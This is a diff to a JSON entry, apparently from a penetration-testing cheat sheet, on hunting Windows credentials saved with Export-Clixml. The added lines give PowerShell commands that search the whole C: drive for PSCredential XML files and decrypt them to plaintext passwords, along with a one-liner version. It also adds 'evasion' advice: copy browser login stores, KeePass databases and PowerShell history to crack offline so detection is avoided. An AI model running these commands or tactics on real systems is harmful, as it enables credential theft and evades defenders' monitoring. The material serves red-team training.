@@ -59,7 +59,7 @@
   ],
   "id": "powershell-clixml-decrypt",
   "name": "Credential Hunting - Decrypt Export-Clixml Secrets",
-  "command": "$c = Import-Clixml -Path '<pass.xml>'; $c.GetNetworkCredential().Password",
+  "command": "$c = Import-Clixml -Path '<cred_xml>'; $c.GetNetworkCredential().Password",
   "description": "PSCredential objects saved with Export-Clixml are DPAPI-encrypted to the saving user. Running as that user, import the file and read the plaintext username/password.",
   "opsec": "loud",
   "mitre": [
@@ -80,6 +80,23 @@
       "HTB M26",
       "MITRE T1552.001",
       "MITRE T1555"
-    ]
-  }
+    ],
+    "evasion": "Copy the credential store (browser Login Data, .kdbx, PSReadline history) and decrypt/crack it OFFLINE rather than running signatured binaries (LaZagne/SharpChrome) on the host; scope searches to likely paths to limit disk I/O; use built-in cmdlets over dropped tools."
+  },
+  "variations": [
+    {
+      "label": "One-liner",
+      "command": "(Import-Clixml '<cred_xml>').GetNetworkCredential().Password"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Find exported credential XML",
+      "command": "Get-ChildItem -Path C:\\ -Include *.xml -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'System.Management.Automation.PSCredential'"
+    },
+    {
+      "label": "Decrypt it (only as the same user/host that saved it)",
+      "command": "$c = Import-Clixml '<cred_xml>'; $c.GetNetworkCredential().Password"
+    }
+  ]
 }
